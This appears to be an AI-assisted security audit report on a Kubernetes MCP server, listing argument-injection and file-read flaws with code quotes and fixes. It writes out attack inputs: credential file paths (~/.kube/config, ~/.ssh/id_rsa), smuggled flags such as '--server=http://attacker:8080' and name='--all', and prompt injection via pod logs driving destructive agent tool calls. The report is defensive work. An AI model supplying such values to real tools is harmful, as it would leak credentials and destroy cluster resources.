# Agent & MCP security report

Scanned: `/tmp/blind/c24` · 2026-11-23T20:37:22+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 2 | 9 | 1 | 3 | 0 | 13 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **28** · agent/MCP code files: **19** · agent instruction files: **1**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · kubectl_create fromFile reads any file on the MCP host and returns it
`None:None` · ASI02 Tool Misuse and Exploitation

fromFile paths are passed straight to kubectl --from-file; with resourceType=configmap, fromFile=['k=/home/user/.kube/config'] (or ~/.aws/credentials, ~/.ssh/id_rsa) and dryRun=true, kubectl prints the file content as YAML back to the model. Without dry-run it stores the file in the cluster.
> `src/tools/kubectl-create.ts:265` — `args.push(`--from-file=${file}`);`
> `src/tools/kubectl-create.ts:410` — `args.push("--dry-run=client");`
> `src/tools/kubectl-create.ts:419` — `args.push("-o", output);`

**Fix:** Drop fromFile, or resolve each path with realpath and require it to be inside an operator-configured directory; never allow it in combination with model-supplied paths outside that directory.

### F018 · CRITICAL · ARG-INJECTION
`src/tools/kubectl-generic.ts:129` · ASI02 Tool Misuse and Exploitation

kubectl_generic runs any kubectl subcommand with any flags and args. Besides full cluster control, 'kubectl cp <pod>:<file> <local path>' writes arbitrary files on the MCP host, 'get secrets -o json' bypasses MASK_SECRETS, and --kubeconfig/--server/--as change credentials or target.
> `src/tools/kubectl-generic.ts:76` — `const cmdArgs: string[] = [input.command];`
> `src/tools/kubectl-generic.ts:118` — `cmdArgs.push(...input.args);`
> `src/tools/kubectl-generic.ts:129` — `const result = execFileSync(command, cmdArgs, {`

**Fix:** Remove the tool or restrict it to an allowlist of read-only verbs (get, describe, top, explain) with an allowlist of flags; never allow cp, plugins, --kubeconfig, --server, --token, --as; require human approval.

### M002 · HIGH · Helm valuesFile reads any local file (cat) / any URL
`None:None` · ASI02 Tool Misuse and Exploitation

valuesFile is any host path (or URL for helm -f). Combined with an attacker-chosen chart/repo, a YAML file such as ~/.kube/config becomes chart values that the chart can render into a ConfigMap and apply to the cluster, where kubectl_get reads it back.
> `src/tools/helm-operations.ts:210` — `valuesContent = executeCommand("cat", [params.valuesFile]);`
> `src/tools/helm-operations.ts:333` — `args.push("-f", params.valuesFile);`

**Fix:** Remove valuesFile or confine it to an allowlisted directory via realpath + containment check; reject URLs; read it with fs.readFileSync instead of spawning cat.

### M003 · HIGH · Read-only / non-destructive / ALLOWED_TOOLS modes only hide tools; they can still be called
`None:None` · 

ALLOW_ONLY_READONLY_TOOLS, ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS and ALLOWED_TOOLS filter only tools/list; the tools/call handler dispatches every tool by name with no check, so a client (or injected prompt) that calls kubectl_generic, kubectl_delete or exec_in_pod directly bypasses the operator's restriction.
> `src/index.ts:193` — `tools = readonlyTools;`
> `src/index.ts:368` — `if (name === "kubectl_generic") {`
> `src/index.ts:551` — `throw new McpError(ErrorCode.InvalidRequest, `Unknown tool: ${name}`);`

**Fix:** Compute the allowed tool set once and reject any tools/call whose name is not in it, before dispatch.

### M004 · HIGH · HTTP/SSE transports: no auth by default and DNS-rebinding protection off
`None:None` · ASI03 Identity and Privilege Abuse

When ENABLE_UNSAFE_STREAMABLE_HTTP_TRANSPORT or ENABLE_UNSAFE_SSE_TRANSPORT is set and MCP_AUTH_TOKEN is not, every request is accepted and there is no Host/Origin check by default, so a web page the user visits can reach the localhost server via DNS rebinding (or anyone on the network if HOST=0.0.0.0) and call kubectl_generic/exec_in_pod.
> `src/utils/auth.ts:34` — `if (!authToken) {`
> `src/utils/streamable-http.ts:23` — `process.env.DNS_REBINDING_PROTECTION === "true";`
> `src/utils/sse.ts:16` — `app.get("/sse", authMiddleware, async (req, res) => {`

**Fix:** Refuse to start HTTP transports without MCP_AUTH_TOKEN, enable DNS-rebinding protection by default with allowedHosts/allowedOrigins, and add the same Host/Origin check to the SSE server.

### M005 · HIGH · Helm release name / chart passed as bare positionals (template mode)
`None:None` · ASI02 Tool Misuse and Exploitation

name and chart are not checked for a leading '-'. In template mode the release name is optional, so name can be a helm flag (e.g. --post-renderer=<program>, which runs a local executable on the rendered chart, or --kube-apiserver/--kubeconfig) while chart still names a chart from the caller-supplied repo.
> `src/tools/helm-operations.ts:306` — `if (params.useTemplate) {`
> `src/tools/helm-operations.ts:220` — `params.name,`
> `src/tools/helm-operations.ts:235` — `const yamlOutput = executeCommand("helm", templateArgs);`

**Fix:** Validate name with ^[a-z0-9]([-a-z0-9]*[a-z0-9])?$, reject a chart that starts with '-', and insert '--' before positionals.

### F002 · HIGH · ARG-INJECTION
`src/tools/kubectl-delete.ts:159` · ASI02 Tool Misuse and Exploitation

resourceType and name go in as bare positionals with no check for a leading '-'. name='--all' deletes every resource of the type in the namespace, and resourceType can carry kubectl global flags such as --server/--token/--as/--kubeconfig, sending the request (and the bearer credential) somewhere else or acting as another identity.
> `src/tools/kubectl-delete.ts:120` — `args.push(input.resourceType!);`
> `src/tools/kubectl-delete.ts:123` — `args.push(input.name);`
> `src/tools/kubectl-delete.ts:159` — `const result = execFileSync(command, args, {`

**Fix:** Reject resourceType/name that start with '-' or do not match ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$ (resourceType: ^[A-Za-z0-9.-]+$), and put '--' before the positional values.

### F003 · HIGH · ARG-INJECTION
`src/tools/kubectl-describe.ts:75` · ASI02 Tool Misuse and Exploitation

resourceType and name are two unvalidated positionals; e.g. resourceType='--server=http://attacker:8080', name='pods' runs a valid describe against an attacker host, or '--as=...'/'--kubeconfig=...' change identity/config.
> `src/tools/kubectl-describe.ts:60` — `const args = ["describe", resourceType, name];`
> `src/tools/kubectl-describe.ts:75` — `const result = execFileSync(command, args, {`

**Fix:** Validate both against a Kubernetes name regex, reject a leading '-', and insert '--' before positionals.

### F004 · HIGH · ARG-INJECTION
`src/tools/kubectl-get.ts:158` · ASI02 Tool Misuse and Exploitation

kubectl_get (listed as a read-only tool) passes resourceType and name as bare positionals; resourceType='--server=http://attacker:8080' with name='pods' (or --as/--token/--kubeconfig) injects kubectl global flags into a still-valid command.
> `src/tools/kubectl-get.ts:90` — `const args = ["get", resourceType];`
> `src/tools/kubectl-get.ts:94` — `args.push(name);`
> `src/tools/kubectl-get.ts:158` — `const result = execFileSync(command, args, {`

**Fix:** Validate resourceType/name with strict regexes, reject a leading '-', put '--' before positionals.

### F006 · HIGH · ARG-INJECTION
`src/tools/kubectl-patch.ts:131` · ASI02 Tool Misuse and Exploitation

resourceType and name are bare positionals; one can carry a kubectl global flag (--server/--as/--token/--kubeconfig) while the other names the resource, so the patch is sent elsewhere or under another identity.
> `src/tools/kubectl-patch.ts:84` — `const args = ["patch", input.resourceType, input.name, "-n", namespace];`
> `src/tools/kubectl-patch.ts:131` — `const result = execFileSync(command, args, {`

**Fix:** Validate resourceType/name, reject a leading '-', insert '--' before positionals.

### F009 · HIGH · ARG-INJECTION
`src/tools/kubectl-scale.ts:68` · ASI02 Tool Misuse and Exploitation

resourceType and name are bare positionals; resourceType='--server=http://attacker:8080' with name='deployment/x' is still a valid scale command, sent to an attacker host (or under --as/--kubeconfig).
> `src/tools/kubectl-scale.ts:55` — `resourceType,`
> `src/tools/kubectl-scale.ts:56` — `input.name,`
> `src/tools/kubectl-scale.ts:68` — `const result = execFileSync(command, args, {`

**Fix:** Validate resourceType/name with strict regexes, reject a leading '-', add '--'.

### M006 · MEDIUM · Pod logs and command output returned raw to the model
`None:None` · 

Container logs and exec output are written by workloads (and anyone who can make them log), and go into the model context unmarked; the same server offers kubectl_generic/exec_in_pod/kubectl_create with no approval, so injected text in a log can drive destructive or exfiltrating calls.
> `src/tools/kubectl-logs.ts:121` — `return formatLogOutput(name, result);`
> `src/tools/exec_in_pod.ts:130` — `text: result,`

**Fix:** Wrap returned logs as untrusted data (clearly delimited, truncated), and require human approval for write/exec tools.

### F005 · LOW · ARG-INJECTION
`src/tools/kubectl-logs.ts:116` · ASI02 Tool Misuse and Exploitation

name is an unvalidated positional, so a value like '-lapp=x' or '--as=...' is parsed as a flag. Only one free positional exists here, so a redirect flag leaves kubectl logs without a pod and it errors out; impact is limited (selecting other pods' logs).
> `src/tools/kubectl-logs.ts:91` — `const name = input.name;`
> `src/tools/kubectl-logs.ts:99` — `let args = ["-n", namespace, "logs", name];`
> `src/tools/kubectl-logs.ts:116` — `const result = execFileSync(command, args, {`

**Fix:** Reject names starting with '-' / validate with a Kubernetes name regex; add '--' before the pod name.

### F007 · LOW · ARG-INJECTION
`src/tools/kubectl-rollout.ts:114` · ASI02 Tool Misuse and Exploitation

subCommand is typed as an enum but never checked at runtime (the low-level Server does not validate inputSchema), so any string reaches kubectl. Because the resource token then lands in the subcommand slot, an injected flag leaves 'kubectl rollout' without a valid subcommand; no high-impact exploit shown.
> `src/tools/kubectl-rollout.ts:80` — `input.subCommand,`
> `src/tools/kubectl-rollout.ts:114` — `const result = execFileSync(command, args, {`

**Fix:** Check subCommand against the allowed list and resourceType against deployment|daemonset|statefulset in code; validate name.

### F008 · LOW · ARG-INJECTION
`src/tools/kubectl-rollout.ts:132` · ASI02 Tool Misuse and Exploitation

Same unvalidated subCommand/resourceType/name as F007 on the non-watch path; flag injection possible but no demonstrated impact beyond a failed command.
> `src/tools/kubectl-rollout.ts:81` — ``${input.resourceType}/${input.name}`,`
> `src/tools/kubectl-rollout.ts:132` — `const result = execFileSync(command, args, {`

**Fix:** Enforce the subCommand and resourceType enums in code and validate name.

## Dismissed as false alarms

- F001 ARG-INJECTION `src/tools/kubectl-apply.ts:101` — Every caller value in kubectl_apply sits in the value slot of a flag (-f, -n, --context), so kubectl consumes it as that flag's value even if it starts with '-'; no extra flag can be injected. execFileSync uses no shell.
- F010 PATH-TRAVERSAL `src/tools/kubectl-apply.ts:75` — The written path is built by the server from os.tmpdir() and a timestamp; only the file content comes from the caller, so there is no path traversal.
- F011 ARG-INJECTION `src/tools/kubectl-context.ts:77` — listArgs are constants; output only selects which constant flags are added.
- F012 ARG-INJECTION `src/tools/kubectl-context.ts:146` — Same constant listArgs as F011; no caller value reaches the arguments.
- F013 ARG-INJECTION `src/tools/kubectl-context.ts:167` — Constant argument list.
- F014 ARG-INJECTION `src/tools/kubectl-context.ts:268` — Constant argument list.
- F015 ARG-INJECTION `src/tools/kubectl-context.ts:303` — Before use-context the name must match a context already present in the operator's kubeconfig (allowlist), so a flag-like value is rejected.
- F016 PATH-TRAVERSAL `src/tools/kubectl-create.ts:240` — Temp path is server-chosen; only content is caller-controlled. (The real file problem in this tool is fromFile, see M001.)
- F017 PATH-TRAVERSAL `src/tools/kubectl-delete.ts:114` — Temp path is server-chosen; only content is caller-controlled.
- F019 ARG-INJECTION `src/tools/kubectl-logs.ts:158` — name is glued into a single '--selector=...' argument, so it cannot become a separate flag.
- F020 ARG-INJECTION `src/tools/kubectl-logs.ts:328` — labelSelector is glued into one '--selector=' argument; namespace is the value of -n. No new flag can be injected.
- F021 ARG-INJECTION `src/tools/kubectl-logs.ts:371` — pod comes from kubectl's own list of pod names (DNS-1123 names cannot start with '-'); container is the value of -c and other options are glued '--x=' forms.
- F022 PATH-TRAVERSAL `src/tools/kubectl-patch.ts:113` — Temp path is server-chosen; content is JSON.stringify of the patch object.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
